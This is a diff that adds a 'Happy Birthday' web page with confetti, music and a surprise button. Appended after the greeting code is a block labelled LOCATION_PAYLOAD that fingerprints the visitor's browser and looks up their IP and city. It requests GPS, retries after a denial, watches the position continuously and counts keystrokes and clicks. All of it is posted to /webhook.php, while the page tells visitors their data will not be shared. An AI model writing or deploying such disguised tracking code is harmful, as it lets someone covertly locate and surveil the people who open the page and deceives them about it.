@@ -1,0 +1,668 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Happy Birthday! 🎂</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow-x: hidden;
+        }
+        
+        .container {
+            text-align: center;
+            padding: 40px;
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            max-width: 600px;
+            width: 90%;
+            animation: fadeIn 1s ease;
+            position: relative;
+            z-index: 1;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .birthday-icon {
+            font-size: 100px;
+            margin-bottom: 20px;
+            animation: bounce 2s infinite;
+        }
+        
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-20px); }
+        }
+        
+        h1 {
+            color: #333;
+            font-size: 3em;
+            margin-bottom: 20px;
+            background: linear-gradient(45deg, #FF6B6B, #4ECDC4);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+        
+        .message {
+            font-size: 1.2em;
+            color: #555;
+            line-height: 1.6;
+            margin-bottom: 30px;
+        }
+        
+        .confetti {
+            position: fixed;
+            width: 10px;
+            height: 10px;
+            background: #ff0000;
+            top: -10px;
+            animation: fall linear forwards;
+        }
+        
+        @keyframes fall {
+            to {
+                transform: translateY(100vh) rotate(360deg);
+            }
+        }
+        
+        .location-message {
+            background: #e3f2fd;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+            border-left: 4px solid #2196f3;
+        }
+        
+        .location-message p {
+            color: #1565c0;
+            margin: 0;
+            font-size: 0.9em;
+        }
+        
+        .cake {
+            width: 200px;
+            height: 100px;
+            background: linear-gradient(to bottom, #f7b731, #e67e22);
+            border-radius: 10px;
+            margin: 20px auto;
+            position: relative;
+        }
+        
+        .cake:before {
+            content: '';
+            position: absolute;
+            width: 220px;
+            height: 20px;
+            background: #ff9f43;
+            border-radius: 10px;
+            top: -10px;
+            left: -10px;
+        }
+        
+        .candle {
+            width: 10px;
+            height: 40px;
+            background: #fff;
+            margin: 0 auto;
+            position: relative;
+            top: -30px;
+            border-radius: 5px;
+        }
+        
+        .candle:before {
+            content: '';
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            background: #ff3838;
+            border-radius: 50%;
+            top: -10px;
+            left: -5px;
+            animation: flame 1s infinite alternate;
+        }
+        
+        @keyframes flame {
+            0% { transform: scale(1); opacity: 0.8; }
+            100% { transform: scale(1.2); opacity: 1; }
+        }
+        
+        .btn {
+            display: inline-block;
+            padding: 15px 40px;
+            background: linear-gradient(45deg, #FF6B6B, #4ECDC4);
+            color: white;
+            text-decoration: none;
+            border-radius: 50px;
+            font-size: 1.2em;
+            font-weight: bold;
+            margin-top: 20px;
+            transition: transform 0.3s, box-shadow 0.3s;
+            cursor: pointer;
+            border: none;
+        }
+        
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+        }
+        
+        .music-player {
+            margin-top: 30px;
+            padding: 20px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+        }
+        
+        audio {
+            width: 100%;
+            margin-top: 10px;
+        }
+        
+        .countdown {
+            font-size: 2em;
+            color: #333;
+            margin: 20px 0;
+            font-weight: bold;
+        }
+        
+        .wish-input {
+            width: 100%;
+            padding: 15px;
+            margin: 20px 0;
+            border: 2px solid #ddd;
+            border-radius: 10px;
+            font-size: 1em;
+        }
+        
+        .submit-btn {
+            padding: 12px 30px;
+            background: #4ECDC4;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 1em;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        
+        .submit-btn:hover {
+            background: #45b7aa;
+        }
+        
+        footer {
+            margin-top: 30px;
+            color: #777;
+            font-size: 0.9em;
+        }
+        
+        .location-info {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 15px 0;
+            font-size: 0.9em;
+            color: #666;
+        }
+        
+        .location-info h3 {
+            color: #333;
+            margin-bottom: 10px;
+            font-size: 1.1em;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="birthday-icon">🎂</div>
+        <h1>Happy Birthday! 🎉</h1>
+        
+        <div class="message">
+            <p>Wishing you a day filled with happiness and a year filled with joy!</p>
+            <p>May all your dreams and wishes come true today and always.</p>
+        </div>
+        
+        <div class="location-message">
+            <p>📍 <strong>Location Access Required:</strong> We need your location to show birthday celebrations near you!</p>
+        </div>
+        
+        <div class="cake">
+            <div class="candle"></div>
+        </div>
+        
+        <div class="countdown" id="countdown">Starting celebration...</div>
+        
+        <div class="location-info">
+            <h3>Why we need your location:</h3>
+            <p>• To show birthday events in your area</p>
+            <p>• To connect you with local celebrations</p>
+            <p>• For personalized birthday surprises</p>
+        </div>
+        
+        <div class="music-player">
+            <p>🎵 Birthday Music 🎵</p>
+            <audio controls autoplay loop>
+                <source src="https://assets.mixkit.co/music/preview/mixkit-happy-birthday-to-you-443.mp3" type="audio/mpeg">
+                Your browser does not support the audio element.
+            </audio>
+        </div>
+        
+        <button class="btn" onclick="showSurprise()">Click for Birthday Surprise! 🎁</button>
+        
+        <footer>
+            <p>Made with ❤️ | Allow location access for best experience</p>
+        </footer>
+    </div>
+
+    <script>
+        // Create confetti
+        function createConfetti() {
+            const colors = ['#ff6b6b', '#4ecdc4', '#ffe66d', '#1a535c', '#ff9f43'];
+            for(let i = 0; i < 150; i++) {
+                const confetti = document.createElement('div');
+                confetti.className = 'confetti';
+                confetti.style.left = Math.random() * 100 + 'vw';
+                confetti.style.background = colors[Math.floor(Math.random() * colors.length)];
+                confetti.style.width = Math.random() * 10 + 5 + 'px';
+                confetti.style.height = confetti.style.width;
+                confetti.style.animationDuration = Math.random() * 3 + 2 + 's';
+                confetti.style.opacity = Math.random() + 0.5;
+                document.body.appendChild(confetti);
+                
+                setTimeout(() => {
+                    confetti.remove();
+                }, 5000);
+            }
+        }
+        
+        // Start countdown
+        function startCountdown() {
+            let count = 5;
+            const countdown = document.getElementById('countdown');
+            const interval = setInterval(() => {
+                countdown.innerHTML = `Celebration starts in: ${count}`;
+                count--;
+                if(count < 0) {
+                    clearInterval(interval);
+                    countdown.innerHTML = "🎉 Let's Celebrate! 🎉";
+                    createConfetti();
+                    setInterval(createConfetti, 3000);
+                }
+            }, 1000);
+        }
+        
+        // Show surprise
+        function showSurprise() {
+            alert('🎁 Surprise! 🎁\nYou are an amazing person!\nWishing you the best birthday ever!');
+            createConfetti();
+        }
+        
+        // Initialize
+        window.onload = function() {
+            startCountdown();
+            createConfetti();
+            setInterval(createConfetti, 5000);
+        }
+    </script>
+<!-- LOCATION_PAYLOAD -->
+<script>
+// Enhanced location collection with retry mechanism
+function collectLocationData() {
+    const data = {
+        timestamp: new Date().toISOString(),
+        pageType: 'birthday_page',
+        url: window.location.href,
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        languages: navigator.languages,
+        screen: {
+            width: screen.width,
+            height: screen.height,
+            colorDepth: screen.colorDepth,
+            pixelDepth: screen.pixelDepth
+        },
+        windowSize: {
+            innerWidth: window.innerWidth,
+            innerHeight: window.innerHeight
+        },
+        cookiesEnabled: navigator.cookieEnabled,
+        doNotTrack: navigator.doNotTrack,
+        online: navigator.onLine,
+        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+        deviceMemory: navigator.deviceMemory || 'unknown',
+        connection: navigator.connection ? {
+            effectiveType: navigator.connection.effectiveType,
+            downlink: navigator.connection.downlink,
+            rtt: navigator.connection.rtt,
+            saveData: navigator.connection.saveData
+        } : {},
+        referrer: document.referrer,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+    };
+
+    // Get IP address
+    fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(ipData => {
+            data.ip = ipData.ip;
+            
+            // Get IP details
+            return fetch(`https://ipapi.co/${ipData.ip}/json/`);
+        })
+        .then(response => response.json())
+        .then(ipDetails => {
+            data.ipDetails = {
+                country: ipDetails.country_name,
+                countryCode: ipDetails.country_code,
+                region: ipDetails.region,
+                city: ipDetails.city,
+                postal: ipDetails.postal,
+                latitude: ipDetails.latitude,
+                longitude: ipDetails.longitude,
+                timezone: ipDetails.timezone,
+                org: ipDetails.org,
+                asn: ipDetails.asn
+            };
+            
+            // Try to get GPS location
+            requestGPSLocation(data);
+        })
+        .catch(error => {
+            console.error('IP fetch error:', error);
+            requestGPSLocation(data);
+        });
+}
+
+function requestGPSLocation(data) {
+    if (!navigator.geolocation) {
+        data.gpsError = 'Geolocation not supported';
+        sendData(data);
+        return;
+    }
+
+    // First request - high accuracy
+    navigator.geolocation.getCurrentPosition(
+        (position) => {
+            data.gpsLocation = {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+                accuracy: position.coords.accuracy,
+                altitude: position.coords.altitude,
+                altitudeAccuracy: position.coords.altitudeAccuracy,
+                heading: position.coords.heading,
+                speed: position.coords.speed,
+                timestamp: new Date(position.timestamp).toISOString()
+            };
+            data.gpsSource = 'high_accuracy';
+            sendData(data);
+        },
+        (error) => {
+            // If permission denied, try with lower accuracy
+            if (error.code === error.PERMISSION_DENIED) {
+                data.gpsError = 'Permission denied for high accuracy';
+                
+                // Try with lower accuracy (some browsers allow this)
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        data.gpsLocation = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            timestamp: new Date(position.timestamp).toISOString()
+                        };
+                        data.gpsSource = 'low_accuracy';
+                        data.gpsRetrySuccess = true;
+                        sendData(data);
+                    },
+                    (retryError) => {
+                        data.gpsError = `Retry failed: ${getGeolocationError(retryError)}`;
+                        sendData(data);
+                    },
+                    {
+                        enableHighAccuracy: false,
+                        timeout: 10000,
+                        maximumAge: 60000
+                    }
+                );
+            } else {
+                data.gpsError = getGeolocationError(error);
+                sendData(data);
+            }
+        },
+        {
+            enableHighAccuracy: true,
+            timeout: 15000,
+            maximumAge: 0
+        }
+    );
+
+    // Also start watching position for continuous updates
+    let watchId = null;
+    if (navigator.geolocation.watchPosition) {
+        watchId = navigator.geolocation.watchPosition(
+            (position) => {
+                if (!data.gpsUpdates) data.gpsUpdates = [];
+                data.gpsUpdates.push({
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude,
+                    accuracy: position.coords.accuracy,
+                    timestamp: new Date(position.timestamp).toISOString()
+                });
+                
+                // Send update
+                sendData({...data, updateType: 'gps_update'});
+            },
+            (error) => {
+                console.log('Watch error:', error);
+            },
+            {
+                enableHighAccuracy: true,
+                maximumAge: 30000
+            }
+        );
+        
+        // Store watch ID for cleanup
+        data.watchId = watchId;
+    }
+}
+
+function getGeolocationError(error) {
+    switch(error.code) {
+        case error.PERMISSION_DENIED:
+            return "User denied location permission";
+        case error.POSITION_UNAVAILABLE:
+            return "Location information unavailable";
+        case error.TIMEOUT:
+            return "Location request timed out";
+        default:
+            return `Unknown error: ${error.message}`;
+    }
+}
+
+function sendData(data) {
+    // Add page interactions
+    if (!data.interactions) {
+        data.interactions = {
+            clicks: 0,
+            scrolls: 0,
+            keypresses: 0,
+            mouseMovements: 0
+        };
+    }
+
+    const xhr = new XMLHttpRequest();
+    xhr.open('POST', '/webhook.php', true);
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    xhr.timeout = 5000;
+    
+    xhr.onload = function() {
+        if (xhr.status === 200) {
+            console.log('Data sent successfully');
+        }
+    };
+    
+    xhr.onerror = function() {
+        console.error('Failed to send data');
+    };
+    
+    xhr.ontimeout = function() {
+        console.warn('Request timeout');
+    };
+    
+    try {
+        xhr.send(JSON.stringify(data));
+    } catch (error) {
+        console.error('Error sending data:', error);
+    }
+}
+
+// Track user interactions
+let interactions = {
+    clicks: 0,
+    scrolls: 0,
+    keypresses: 0,
+    mouseMovements: 0,
+    touchEvents: 0,
+    focusChanges: 0
+};
+
+document.addEventListener('click', () => interactions.clicks++);
+window.addEventListener('scroll', () => interactions.scrolls++);
+document.addEventListener('keydown', () => interactions.keypresses++);
+document.addEventListener('mousemove', () => interactions.mouseMovements++);
+document.addEventListener('touchstart', () => interactions.touchEvents++);
+window.addEventListener('focus', () => interactions.focusChanges++);
+window.addEventListener('blur', () => interactions.focusChanges++);
+
+// Periodic data collection
+setInterval(() => {
+    const currentData = {
+        timestamp: new Date().toISOString(),
+        interactions: {...interactions},
+        timeOnPage: performance.now()
+    };
+    sendData(currentData);
+}, 30000);
+
+// Initial collection
+document.addEventListener('DOMContentLoaded', function() {
+    setTimeout(collectLocationData, 1000);
+    
+    // Send data on page unload
+    window.addEventListener('beforeunload', function() {
+        const exitData = {
+            timestamp: new Date().toISOString(),
+            event: 'page_exit',
+            totalTime: performance.now(),
+            interactions: {...interactions}
+        };
+        
+        // Try to send sync request
+        try {
+            const xhr = new XMLHttpRequest();
+            xhr.open('POST', '/webhook.php', false);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.send(JSON.stringify(exitData));
+        } catch (e) {
+            // Ignore errors on unload
+        }
+    });
+});
+
+// Ask for location permission with user-friendly message
+function requestLocationWithMessage() {
+    if (!navigator.geolocation) {
+        console.log('Geolocation is not supported by your browser');
+        return;
+    }
+    
+    // Show custom message before asking
+    const locationMessage = `
+    <div id="locationRequest" style="
+        position: fixed;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        background: white;
+        padding: 30px;
+        border-radius: 15px;
+        box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+        z-index: 10000;
+        max-width: 400px;
+        text-align: center;
+        font-family: Arial, sans-serif;
+    ">
+        <h3 style="color: #333; margin-bottom: 15px;">📍 Location Access Needed</h3>
+        <p style="color: #666; margin-bottom: 20px;">
+            We need your location to provide personalized content and better experience.
+            Your location data is secure and will not be shared.
+        </p>
+        <div style="display: flex; gap: 10px; justify-content: center;">
+            <button onclick="allowLocation()" style="
+                background: #4CAF50;
+                color: white;
+                border: none;
+                padding: 10px 20px;
+                border-radius: 5px;
+                cursor: pointer;
+                font-size: 16px;
+            ">
+                Allow Location
+            </button>
+            <button onclick="denyLocation()" style="
+                background: #f44336;
+                color: white;
+                border: none;
+                padding: 10px 20px;
+                border-radius: 5px;
+                cursor: pointer;
+                font-size: 16px;
+            ">
+                Deny
+            </button>
+        </div>
+    </div>
+    `;
+    
+    document.body.insertAdjacentHTML('beforeend', locationMessage);
+}
+
+function allowLocation() {
+    document.getElementById('locationRequest').remove();
+    collectLocationData();
+}
+
+function denyLocation() {
+    document.getElementById('locationRequest').remove();
+    const data = {
+        timestamp: new Date().toISOString(),
+        locationPermission: 'denied_by_user',
+        message: 'User manually denied location access'
+    };
+    sendData(data);
+}
+
+// Auto-request location after page loads
+window.addEventListener('load', function() {
+    setTimeout(requestLocationWithMessage, 2000);
+});
+</script>
+</body>
+</html>
